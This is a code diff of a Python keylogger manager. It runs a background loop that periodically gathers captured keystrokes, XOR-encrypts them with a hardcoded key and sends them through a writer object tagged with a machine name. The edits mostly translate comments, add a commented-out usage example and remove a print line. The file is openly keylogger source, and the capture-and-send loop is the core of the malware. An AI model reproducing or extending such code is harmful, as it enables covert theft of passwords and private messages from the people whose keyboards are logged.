@@ -19,12 +19,12 @@ class KeyLoggerManager:
         self.thread = None
 
     def _run(self):
-        """לולאה שרצה ברקע ושומרת כל כמה שניות את ה-buffer לקובץ"""
+        """Boucle qui tourne en arrière-plan et sauvegarde le buffer toutes les X secondes"""
         while self.running:
             time.sleep(self.interval)
             data = self.logger.get_logged_keys()
-            if data:  # רק אם יש נתונים
-                xor = crp.xor_encrypt(data,"avi")
+            if data:
+                xor = crp.xor_encrypt(data, "avi")
                 self.writer.send_data(xor, self.machine_name)
 
     def start(self):
@@ -47,6 +47,16 @@ class KeyLoggerManager:
 
 
 # דוגמה לשימוש
+# if __name__ == "__main__":
+#     manager = KeyLoggerManager(interval_seconds=5, machine_name="DANIEL")
+#     manager.start()
+#     print("Keylogger started, לחץ ESC לעצירה...")
+#     try:
+#         while True:
+#             time.sleep(1)
+#     except KeyboardInterrupt:
+#         manager.stop()
+#     print("Keylogger stopped.")
 if __name__ == "__main__":
     manager = KeyLoggerManager(interval_seconds=5, machine_name="DANIEL")
     manager.start()
@@ -56,5 +66,4 @@ if __name__ == "__main__":
             time.sleep(1)
     except KeyboardInterrupt:
         manager.stop()
-    print("Keylogger stopped.")
 
